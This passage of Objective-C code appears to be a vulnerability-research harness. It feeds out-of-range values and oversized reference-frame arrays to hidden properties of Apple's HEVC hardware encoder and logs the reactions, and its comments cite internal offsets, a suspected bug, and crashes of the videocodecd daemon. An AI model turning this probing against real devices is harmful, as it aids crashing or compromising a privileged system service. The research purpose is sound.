                        VTSessionSetProperty(fbS, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@16447);
                        KPH9SafeTeardown(fbS);
                    }
                }
            }
            @synchronized ([KPH9EncoderModule class]) {
                res->closed = 1;
                NSString *cbCombined = nil;
                if (res->targetHit && strstr(res->first, "sbuf=NULL") != NULL) {
                    cbCombined = [NSString stringWithFormat:@"%s -> %s", res->first, res->target];
                } else {
                    cbCombined = [NSString stringWithUTF8String:res->first] ?: @"(no cb)";
                }
                KPH9OutAppend(log, @"  ratio %4d/%2d (x%-3d) -> u1Prep=%d u1POST=%d | u0Set=%d u0Prep=%d u0POST=%d | %@\n",
                              expFps, baseFps, ratio, (int)u1PrepSt, u1PostNtl,
                              (int)setNtlSt, (int)prepSt, postNtl, cbCombined);
            }
            KPH9SafeTeardownEx(session, NULL, res);
        } else {
            free(res);
        }
        CFRelease(nExp);
        CFRelease(nBase);
    }
    // Fractional (< 1.0) & non-dyadic ExpectedFrameRate / BaseLayerFrameRate pairs (with NTL=16447 vs NTL=3)
    int fracPairs[][2] = { {15, 30}, {15, 60}, {15, 120}, {1, 60}, {45, 15}, {75, 15} };
    for (size_t fi = 0; fi < sizeof(fracPairs) / sizeof(fracPairs[0]); fi++) {
        int expFps = fracPairs[fi][0];
        int baseFps = fracPairs[fi][1];
        int u1Post = -1, u0Post16k = -1, u0Post3 = -1;
        OSStatus u1Prep = -999, u0Prep16k = -999, u0Prep3 = -999;
        {
            VTCompressionSessionRef us = NULL;
            if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                           NULL, NULL, NULL, NULL, NULL, &us) == noErr && us) {
                VTSessionSetProperty(us, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                VTSessionSetProperty(us, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                VTSessionSetProperty(us, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
                KPH9PrimeRealTime(us);
                VTSessionSetProperty(us, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@(expFps));
                VTSessionSetProperty(us, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@(baseFps));
                VTSessionSetProperty(us, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@16447);
                u1Prep = VTCompressionSessionPrepareToEncodeFrames(us);
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(us, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &u1Post);
                    CFRelease(rb);
                }
                KPH9SafeTeardown(us);
            }
        }
        {
            VTCompressionSessionRef s16 = NULL;
            if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                           NULL, NULL, NULL, NULL, NULL, &s16) == noErr && s16) {
                VTSessionSetProperty(s16, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                VTSessionSetProperty(s16, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                VTSessionSetProperty(s16, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
                VTSessionSetProperty(s16, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@(expFps));
                VTSessionSetProperty(s16, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@(baseFps));
                VTSessionSetProperty(s16, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@16447);
                u0Prep16k = VTCompressionSessionPrepareToEncodeFrames(s16);
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(s16, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &u0Post16k);
                    CFRelease(rb);
                }
                KPH9SafeTeardown(s16);
            }
        }
        Stage6ProbeResult *fRes = Stage6AllocResult();
        if (fRes) {
            VTCompressionSessionRef s3 = NULL;
            if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                           NULL, NULL, NULL, Stage6OutputCallback, fRes, &s3) == noErr && s3) {
                VTSessionSetProperty(s3, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                VTSessionSetProperty(s3, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                VTSessionSetProperty(s3, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
                VTSessionSetProperty(s3, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@(expFps));
                VTSessionSetProperty(s3, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@(baseFps));
                VTSessionSetProperty(s3, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@3);
                u0Prep3 = VTCompressionSessionPrepareToEncodeFrames(s3);
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(s3, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &u0Post3);
                    CFRelease(rb);
                }
                if (px6B) {
                    VTCompressionSessionEncodeFrame(s3, px6B, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    int w0 = 0;
                    while (fRes->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                }
                @synchronized ([KPH9EncoderModule class]) {
                    fRes->closed = 1;
                    KPH9OutAppend(log, @"  frac  %4d/%-3d -> u1(16k)=%d/%d u0(16k)=%d/%d u0(ntl3)=%d/%d | %s\n",
                                  expFps, baseFps, (int)u1Prep, u1Post, (int)u0Prep16k, u0Post16k,
                                  (int)u0Prep3, u0Post3, fRes->first);
                }
                KPH9SafeTeardownEx(s3, NULL, fRes);
            } else {
                free(fRes);
            }
        }
    }
    // Fractional 15/30 NTL sub-layer ladder: in 15/30 (ExpectedFPS < BaseFPS), VTSessionCopyProperty
    // reports POST=1, yet NTL=3 emitted 26B VPS (40010c05 -> max_sub_layers_minus1=2) and 30B SPS (42010501)!
    // Audit NTL = 1..16447 at 15/30 with real EncodeFrame (+ ForceKeyFrame retry without resetting NTL) to find
    // the exact sub-layer emission limit when ExpectedFrameRate < BaseLayerFrameRate.
    int fracNtls[] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 16, 16447 };
    for (size_t fni = 0; fni < sizeof(fracNtls) / sizeof(fracNtls[0]); fni++) {
        int ntl = fracNtls[fni];
        Stage6ProbeResult *fnRes = Stage6AllocResult();
        if (!fnRes) continue;
        VTCompressionSessionRef fnS = NULL;
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                       NULL, NULL, NULL, Stage6OutputCallback, fnRes, &fnS) == noErr && fnS) {
            VTSessionSetProperty(fnS, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
            VTSessionSetProperty(fnS, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
            VTSessionSetProperty(fnS, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
            VTSessionSetProperty(fnS, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@15);
            VTSessionSetProperty(fnS, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@30);
            OSStatus setSt = VTSessionSetProperty(fnS, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
            OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(fnS);
            int postNtl = -1;
            CFNumberRef rb = NULL;
            if (VTSessionCopyProperty(fnS, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                CFNumberGetValue(rb, kCFNumberIntType, &postNtl);
                CFRelease(rb);
            }
            if (px6B) {
                VTCompressionSessionEncodeFrame(fnS, px6B, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                int w0 = 0;
                while (fnRes->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                if (strstr(fnRes->first, "sbuf=NULL") != NULL) {
                    // For ntl >= 8 in 15/30 mode, [pINS + 0x2eec] = ntl - 1 >= 7 exceeds 3-bit vps_max_sub_layers_minus1 (0..6);
                    // encode IDR at effNtl=7 on a clean 15/30 session and latch NumberOfTemporalLayers=ntl post-IDR.
                    VTCompressionSessionRef fbS = NULL;
                    if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                                   NULL, NULL, NULL, Stage6OutputCallback, fnRes, &fbS) == noErr && fbS) {
                        VTSessionSetProperty(fbS, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                        VTSessionSetProperty(fbS, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                        VTSessionSetProperty(fbS, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
                        VTSessionSetProperty(fbS, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@15);
                        VTSessionSetProperty(fbS, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@30);
                        VTSessionSetProperty(fbS, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@7);
                        VTCompressionSessionPrepareToEncodeFrames(fbS);
                        VTCompressionSessionEncodeFrame(fbS, px6B, CMTimeMake(1, 30), kCMTimeInvalid,
                                                        NULL, (void *)(uintptr_t)0xCAFE, NULL);
                        int w1 = 0;
                        while (!fnRes->targetHit && w1 < 80) { usleep(2000); w1 += 2; }
                        VTSessionSetProperty(fbS, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                        VTSessionSetProperty(fbS, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                        CFNumberRef rbLat = NULL;
                        if (VTSessionCopyProperty(fbS, CFSTR("NumberOfTemporalLayers"), NULL, &rbLat) == noErr && rbLat) {
                            CFNumberGetValue(rbLat, kCFNumberIntType, &postNtl);
                            CFRelease(rbLat);
                        }
                        KPH9SafeTeardown(fbS);
                    }
                }
            }
            @synchronized ([KPH9EncoderModule class]) {
                fnRes->closed = 1;
                NSString *cbCombined = nil;
                if (fnRes->targetHit && strstr(fnRes->first, "sbuf=NULL") != NULL) {
                    cbCombined = [NSString stringWithFormat:@"%s -> %s", fnRes->first, fnRes->target];
                } else {
                    cbCombined = [NSString stringWithUTF8String:fnRes->first] ?: @"(no cb)";
                }
                KPH9OutAppend(log, @"  fracNTL[15/30 ntl=%-5d] set=%d prep=%d POST=%d | %@\n",
                              ntl, (int)setSt, (int)prepSt, postNtl, cbCombined);
            }
            KPH9SafeTeardownEx(fnS, NULL, fnRes);
        } else {
            free(fnRes);
        }
    }
    if (px6B) CVPixelBufferRelease(px6B);
}

static NSString *Stage7ReadbackDPB(VTCompressionSessionRef session) {
    CFTypeRef rbProp = NULL;
    OSStatus rbSt = VTSessionCopyProperty(session, CFSTR("UserDPBFramesForFaceTime"), kCFAllocatorDefault, &rbProp);
    if (rbSt == noErr && rbProp) {
        NSString *rbStr = nil;
        if (CFGetTypeID(rbProp) == CFArrayGetTypeID()) {
            CFIndex c = CFArrayGetCount((CFArrayRef)rbProp);
            id firstObj = (c > 0) ? [(__bridge NSArray *)rbProp firstObject] : @"empty";
            id lastObj  = (c > 0) ? [(__bridge NSArray *)rbProp lastObject]  : @"empty";
            // Verify DSC .68 0x92f13c bug: AVE_Prop_HEVC_GetUserRPSForFaceTime reads [pINS + 0x2e2c..0x2e74] (DPB snapshot)!
            CFTypeRef rpsAlias = NULL;
            CFIndex rpsAliasCnt = -1;
            if (VTSessionCopyProperty(session, CFSTR("UserRPSForFaceTime"), kCFAllocatorDefault, &rpsAlias) == noErr && rpsAlias) {
                if (CFGetTypeID(rpsAlias) == CFArrayGetTypeID()) rpsAliasCnt = CFArrayGetCount((CFArrayRef)rpsAlias);
                CFRelease(rpsAlias);
            }
            rbStr = [NSString stringWithFormat:@"arr(%ld,rpsAlias=%ld,first=%@,last=%@)", (long)c, (long)rpsAliasCnt, firstObj, lastObj];
        } else {
            rbStr = [NSString stringWithFormat:@"type=%lu", (unsigned long)CFGetTypeID(rbProp)];
        }
        CFRelease(rbProp);
        return rbStr;
    }
    return [NSString stringWithFormat:@"err=%d", (int)rbSt];
}

// timingMode:
//   0 = @pre             (set UserDPBFramesForFaceTime BEFORE PrepareToEncodeFrames)
//   1 = @lazy            (set BEFORE EncodeFrame[0], no explicit PrepareToEncodeFrames)
//   2 = @post-prep       (call PrepareToEncodeFrames FIRST, then set UserDPBFramesForFaceTime before EncodeFrame[0])
//   3 = @post-idr        (call PrepareToEncodeFrames + EncodeFrame[0] IDR FIRST, then set UserDPBFramesForFaceTime before EncodeFrame[1])
//   4 = @post-4p         (call PrepareToEncodeFrames + IDR + 4 P/B-frames FIRST and drain cbCount>=5 so full B-pyramid populates DPB)
//   5 = @post-idr+reprep (like @post-idr, then call PrepareToEncodeFrames AGAIN after SetProperty)
//   6 = @post-idr+kf     (like @post-idr, and pass ForceKeyFrame=YES on the post-update frame so H9 re-runs sequence/GOP init)
static void Stage7RunCustomDPBArrayPool(NSMutableString *log,
                                        NSArray *poolBuffers,
                                        NSString *label,
                                        NSArray *arr,
                                        int timingMode,
                                        BOOL passInFrameProps) {
    Stage6ProbeResult *res = Stage6AllocResult();
    if (!res) return;
    res->targetIdx = -1;
    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, NULL, Stage6OutputCallback, res, &session);
    if (st != noErr || !session) {
        KPH9OutAppend(log, @"  dpb[%@] create=%d\n", label, (int)st);
        free(res);
        return;
    }
    VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
    VTSessionSetProperty(session, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
    KPH9PrimeRealTime(session);
    OSStatus setSt = -999;
    OSStatus prepSt = -999;
    NSString *rbStr = @"none";
    OSStatus e0 = -1, e1 = -1;
    int64_t nextPts = 0;
    CVPixelBufferRef px0 = poolBuffers.count ? (__bridge CVPixelBufferRef)poolBuffers[0] : NULL;
    if (timingMode == 0) {
        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
        rbStr = Stage7ReadbackDPB(session);
        prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
    } else if (timingMode == 2) {
        prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
        rbStr = Stage7ReadbackDPB(session);
    } else if (timingMode >= 3) {
        prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
        if (px0) {
            e0 = VTCompressionSessionEncodeFrame(session, px0, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
            int w0 = 0;
            while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
            if (timingMode == 4) {
                // Подаём разные CVPixelBufferRef из пула, чтобы их IOSurfaceID
                // зарегистрировались во внутреннем DPB до SetDPBSnapShot
                for (int warm = 1; warm <= 4; warm++) {
                    CVPixelBufferRef wpb = (__bridge CVPixelBufferRef)poolBuffers[(NSUInteger)warm % poolBuffers.count];
                    VTCompressionSessionEncodeFrame(session, wpb, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
                }
                int ww = 0;
                while (res->cbCount < 5 && ww < 120) { usleep(2000); ww += 2; }
            }
        }
        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
        rbStr = Stage7ReadbackDPB(session);
    }
    if (px0) {
        res->targetHit = 0;
        res->targetIdx = -1;
        if (timingMode <= 2) {
            e0 = VTCompressionSessionEncodeFrame(session, px0, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
            int w0 = 0;
            while (res->cbCount < 1 && w0 < 60) { usleep(2000); w0 += 2; }
        }
        NSMutableDictionary *fp = [NSMutableDictionary dictionary];
        if (passInFrameProps && arr) {
            fp[@"UserDPBFramesForFaceTime"] = arr;
        }
        CFDictionaryRef fpRef = fp.count ? (__bridge CFDictionaryRef)fp : NULL;
        CVPixelBufferRef targetPb = (__bridge CVPixelBufferRef)poolBuffers[(NSUInteger)nextPts % poolBuffers.count];
        e1 = VTCompressionSessionEncodeFrame(session, targetPb, CMTimeMake(nextPts++, 30), kCMTimeInvalid,
                                             fpRef, (void *)(uintptr_t)0xCAFE, NULL);
        int waited = 0;
        while ((!res->targetHit || res->cbCount < 2) && waited < 120) {
            usleep(2000);
            waited += 2;
        }
        for (int flush = 0; flush < 4 && (!res->targetHit || res->cbCount < 2); flush++) {
            CVPixelBufferRef fpb = (__bridge CVPixelBufferRef)poolBuffers[(NSUInteger)nextPts % poolBuffers.count];
            VTCompressionSessionEncodeFrame(session, fpb, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
            int sw = 0;
            while ((!res->targetHit || res->cbCount < 2) && sw < 40) {
                usleep(2000);
                sw += 2;
            }
        }
    }
    @synchronized ([KPH9EncoderModule class]) {
        res->closed = 1;
        const char *postCb = res->targetHit ? res->target : res->second;
        KPH9OutAppend(log, @"  dpb[%@] set=%d prep=%d rb=%@ enc=%d/%d cbs=%d | cb1: %s | cbPost(#%d): %s\n",
                      label, (int)setSt, (int)prepSt, rbStr,
                      (int)e0, (int)e1, res->cbCount, res->first, res->targetIdx, postCb);
    }
    KPH9SafeTeardownEx(session, NULL, res);
}

static void Stage7DumpSupportedProperties(NSMutableString *log) {
    KPH9OutAppend(log, @"  [7A: VTSessionCopySupportedPropertyDictionary & Default Value Schema]\n");
    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
    if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                   (__bridge CFDictionaryRef)spec, NULL, NULL,
                                   NULL, NULL, &session) != noErr || !session) {
        KPH9OutAppend(log, @"  supportedProps: session create failed\n");
        return;
    }
    VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
    VTSessionSetProperty(session, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
    CFDictionaryRef supp = NULL;
    OSStatus st = VTSessionCopySupportedPropertyDictionary(session, &supp);
    if (st == noErr && supp) {
        NSDictionary *nsSupp = (__bridge NSDictionary *)supp;
        NSArray *allKeys = [[nsSupp allKeys] sortedArrayUsingSelector:@selector(compare:)];
        KPH9OutAppend(log, @"  supportedProps total=%lu\n", (unsigned long)allKeys.count);
        NSMutableArray *otherProps = [NSMutableArray array];
        for (NSString *k in allKeys) {
            NSString *kl = [k lowercaseString];
            CFTypeRef curVal = NULL;
            OSStatus cpSt = VTSessionCopyProperty(session, (__bridge CFStringRef)k, kCFAllocatorDefault, &curVal);
            unsigned long tid = (cpSt == noErr && curVal) ? (unsigned long)CFGetTypeID(curVal) : 0;
            NSString *curDesc = @"none";
            if (cpSt == noErr && curVal) {
                curDesc = [NSString stringWithFormat:@"%@(tid=%lu)",
                           [[(__bridge id)curVal description] stringByReplacingOccurrencesOfString:@"\n" withString:@" "],
                           tid];
                CFRelease(curVal);
            } else {
                curDesc = [NSString stringWithFormat:@"err=%d", (int)cpSt];
            }
            if ([kl containsString:@"facetime"] || [kl containsString:@"rps"] ||
                [kl containsString:@"dpb"] || [kl containsString:@"ref"] ||
                [kl containsString:@"temporal"] || [kl containsString:@"layer"] ||
                [kl containsString:@"usage"] || [kl containsString:@"ltr"] ||
                [kl containsString:@"ack"] || [kl containsString:@"base"] ||
                [kl containsString:@"force"] || [kl containsString:@"slice"] ||
                [kl containsString:@"ichat"] || [kl containsString:@"param"] ||
                [kl containsString:@"str"] || [kl containsString:@"gop"] ||
                [kl containsString:@"frame"] || [kl containsString:@"pps"] ||
                [kl containsString:@"sps"] || [kl containsString:@"vps"] ||
                [kl containsString:@"chroma"] || [kl containsString:@"multi"] ||
                [kl containsString:@"tile"] || [kl containsString:@"log2"] ||
                [kl containsString:@"aux"] || [kl containsString:@"alpha"] ||
                [kl containsString:@"view"] || (tid == 18 || tid == 19)) {
                id meta = nsSupp[k];
                NSString *metaStr = [[meta description] stringByReplacingOccurrencesOfString:@"\n" withString:@" "];
                while ([metaStr containsString:@"  "]) {
                    metaStr = [metaStr stringByReplacingOccurrencesOfString:@"  " withString:@" "];
                }
                KPH9OutAppend(log, @"    prop[%@] cur=%@ meta=%@\n", k, curDesc, metaStr);
            } else {
                [otherProps addObject:[NSString stringWithFormat:@"%@(tid=%lu)", k, tid]];
            }
        }
        if (otherProps.count > 0) {
            KPH9OutAppend(log, @"    otherSupportedProps(%lu): %@\n",
                          (unsigned long)otherProps.count, [otherProps componentsJoinedByString:@", "]);
        }
        CFRelease(supp);
    } else {
        KPH9OutAppend(log, @"  supportedProps err=%d\n", (int)st);
    }
    KPH9SafeTeardown(session);
}

static void RunStage7_MalfunctionMatrix(NSMutableString *log) {
    KPH9OutAppend(log, @"\n--- Stage 7: Supported Props Schema, Post-IDR DPB Updates & UserRPS Session Schema ---\n");
    CVPixelBufferRef px = CreateDummyNV12Buffer(192, 144);
    if (!px) {
        KPH9OutAppend(log, @"  [!] Failed to allocate CVPixelBuffer\n");
        return;
    }

    // 7A: Dump supported property schema from H9 over XPC + safe read-only hidden AVE property probe
    // WARNING: Never blindly call VTSessionSetProperty with kCFBooleanTrue / CFNumber / CFString
    // on untyped hidden properties (e.g. UserParameterSetsIds expects CFArray, DPBRequirements
    // expects CFDictionary) — type mismatch triggers an uncaught NSInvalidArgumentException
    // (SIGABRT) in videocodecd and locks it into launchd's 320s respawn throttle!
    Stage7DumpSupportedProperties(log);
    {
        VTCompressionSessionRef hs = NULL;
        NSDictionary *hspec = @{ @"EnableUserRefForFacetime": @YES };
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)hspec, NULL, NULL, NULL, NULL, &hs) == noErr && hs) {
            NSArray *hiddenProps = @[
                @"ForceSliceRPS", @"DPBNumberOfFrames", @"DPBAllocateRVRABuffers",
                @"FTUsageType", @"UseLongTermReference", @"iChatUsageString",
                @"DPBRequirements", @"UserParameterSetsIds"
            ];
            for (NSString *hp in hiddenProps) {
                CFTypeRef val = NULL;
                OSStatus cpSt = VTSessionCopyProperty(hs, (__bridge CFStringRef)hp, kCFAllocatorDefault, &val);
                NSString *valStr = @"none";
                if (cpSt == noErr && val) {
                    valStr = [NSString stringWithFormat:@"%@(tid=%lu)",
                              [[(__bridge id)val description] stringByReplacingOccurrencesOfString:@"\n" withString:@" "],
                              (unsigned long)CFGetTypeID(val)];
                    CFRelease(val);
                }
                KPH9OutAppend(log, @"    hidden[%@] copy=%d(%@)\n", hp, (int)cpSt, valStr);
            }
            KPH9SafeTeardown(hs);
        }
        // Resolve private VideoToolbox CFStringRef constants via dlsym
        const char *vtSyms[] = {
            "kVTCompressionPropertyKey_DPBRequirements",
            "kVTDPBRequirements_NumberOfFrames",
            "kVTDPBRequirements_AllocateRVRABuffers",
            "kVTCompressionPropertyKey_UserDPBFramesForFaceTime",
            "kVTCompressionPropertyKey_UserRPSForFaceTime",
            "kVTEncodeFrameOptionKey_SetDPB",
            "kVTEncodeFrameOptionKey_DPB_ReferenceFrames",
            "kVTEncodeFrameOptionKey_DPB_FrameNumberFromIDR",
            "kVTEncodeFrameOptionKey_DPB_LongTermFrameNumberFromIDR",
            "kVTEncodeFrameOptionKey_DPB_HowManyShortTermFromIDR",
            "kVTEncodeFrameOptionKey_DPB_NumberOfReferenceFrames",
            "kVTSampleAttachment_GetDPB",
        };
        NSMutableArray *symParts = [NSMutableArray array];
        for (size_t si = 0; si < sizeof(vtSyms) / sizeof(vtSyms[0]); si++) {
            CFStringRef *symPtr = (CFStringRef *)dlsym(RTLD_DEFAULT, vtSyms[si]);
            if (symPtr && *symPtr) {
                [symParts addObject:[NSString stringWithFormat:@"%s=%@", vtSyms[si], (__bridge NSString *)(*symPtr)]];
            } else {
                [symParts addObject:[NSString stringWithFormat:@"%s=NULL", vtSyms[si]]];
            }
        }
        KPH9OutAppend(log, @"    vtSyms: %@\n", [symParts componentsJoinedByString:@" | "]);
    }

    // 7B: DPB matrix with LIVE ENCODED IOSurfaceIDs (analyst: SetDPBSnapShot
    // accepts only surfaces already passed through EncodeFrame in this session).
    KPH9OutAppend(log, @"  [7B: DPB Matrix with live encoded IOSurfaceIDs (4..34 elements = 2..17 pairs)]\n");
    NSMutableArray *stage7Holders = [NSMutableArray array];
    NSArray<NSNumber *> *stage7PoolIDs = KPH9AllocSurfacePool(17, 192, 144, stage7Holders);
    uint32_t sid0 = stage7PoolIDs[0].unsignedIntValue;
    uint32_t sid1 = stage7PoolIDs[1].unsignedIntValue;
    KPH9OutAppend(log, @"  [surf pool] sid0=0x%x sid1=0x%x pool[0..2]=%u,%u,%u\n",
                  sid0, sid1,
                  stage7PoolIDs[0].unsignedIntValue,
                  stage7PoolIDs[1].unsignedIntValue,
                  stage7PoolIDs[2].unsignedIntValue);
    NSMutableArray *zero32 = [NSMutableArray arrayWithCapacity:32];
    for (int i = 0; i < 32; i++) [zero32 addObject:@0];
    NSMutableArray *zero34 = [NSMutableArray arrayWithCapacity:34];
    for (int i = 0; i < 34; i++) [zero34 addObject:@0];
    NSMutableArray *surfPairs32 = [NSMutableArray arrayWithCapacity:32];
    for (int p = 0; p < 16; p++) {
        // Первые 5 буферов пула реально проходят через EncodeFrame в режиме @post-4p
        [surfPairs32 addObject:stage7PoolIDs[(NSUInteger)(p % 5)]];
        [surfPairs32 addObject:@0];
    }
    NSMutableArray *surfPairs34 = [NSMutableArray arrayWithCapacity:34];
    for (int p = 0; p < 17; p++) {
        [surfPairs34 addObject:stage7PoolIDs[(NSUInteger)(p % 5)]];
        [surfPairs34 addObject:@0];
    }
    NSMutableArray *zero32PlusLastSurfPair = [zero32 mutableCopy];
    [zero32PlusLastSurfPair addObject:@(sid0)];
    [zero32PlusLastSurfPair addObject:@0];

    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x4 (0,0,0,0)@pre",            @[ @0, @0, @0, @0 ],           0, NO);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x32 allZero@pre",             zero32,                        0, NO);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x34 allZero@pre",             zero34,                        0, NO);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x4 (sid0,0,sid1,0)@post-idr", @[ @(sid0), @0, @(sid1), @0 ], 3, YES);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x4 (sid0,0,sid1,0)@post-4p",  @[ @(sid0), @0, @(sid1), @0 ], 4, YES);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x32 surfPairs@post-4p",       surfPairs32,                   4, YES);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x34 surfPairs@post-4p",       surfPairs34,                   4, YES);
    Stage7RunCustomDPBArrayPool(log, stage7Holders, @"x34 zero32+surfPair16@post-4p", zero32PlusLastSurfPair,     4, YES);

    // 7C: Pair boundary (x32/x34/x36) with live encoded surf IDs @post-4p
    // (flat UserRPS stays removed — SIGABRT in videocodecd).
    KPH9OutAppend(log, @"  [7C: UserDPBFramesForFaceTime Pair Boundary (x32, x34, x36) @post-4p]\n");
    int dpbPairLens[] = { 32, 34, 36 };
    for (size_t di = 0; di < sizeof(dpbPairLens) / sizeof(dpbPairLens[0]); di++) {
        int len = dpbPairLens[di];
        NSMutableArray *pairArr = [NSMutableArray arrayWithCapacity:(NSUInteger)len];
        for (int k = 0; k < len; k += 2) {
            NSUInteger pairIdx = (NSUInteger)(k / 2) % 5;
            [pairArr addObject:stage7PoolIDs[pairIdx]];
            [pairArr addObject:@0];
        }
        NSString *lbl = [NSString stringWithFormat:@"x%d surfPairs@post-4p", len];
        Stage7RunCustomDPBArrayPool(log, stage7Holders, lbl, pairArr, 4, YES);
    }

    // 7D: DPBRequirements schema (CFArray of CFDictionary vs CFDictionary) & SetDPB structured dictionary check at cb#6
    KPH9OutAppend(log, @"  [7D: DPBRequirements Schema (CFArray<CFDictionary> vs CFDictionary) & Structured SetDPB Check @post-4p]\n");
    int reqCounts[] = { 4, 16, 17, 18, 24 };
    for (size_t ri = 0; ri < sizeof(reqCounts) / sizeof(reqCounts[0]); ri++) {
        int rn = reqCounts[ri];
        NSDictionary *reqSingleDict0 = @{
            @"NumberOfFrames": @(rn),
            @"AllocateRVRABuffers": (id)kCFBooleanFalse,
        };
        NSDictionary *reqSingleDict1 = @{
            @"NumberOfFrames": @(rn),
            @"AllocateRVRABuffers": (id)kCFBooleanTrue,
        };
        NSArray *reqDictArr1 = @[ reqSingleDict1 ];
        NSArray *reqDictArr2 = @[ reqSingleDict0, reqSingleDict1 ];
        NSMutableArray *reqDictArrN = [NSMutableArray arrayWithCapacity:(NSUInteger)rn];
        for (int k = 0; k < rn; k++) {
            [reqDictArrN addObject:@{
                @"NumberOfFrames": @((k % 16) + 1),
                @"AllocateRVRABuffers": (id)kCFBooleanFalse,
            }];
        }

        // 1) Test DPBRequirements (read-only output property in AVE_Prop_HEVC_GetDPBRequirements; setter has no dispatch entry -> -12900)
        //    alongside PropertyMode=1 MultiReferencePSpacing / ForceRefUncompressed / UseReferenceCompressedBuffers @pre and @post-idr
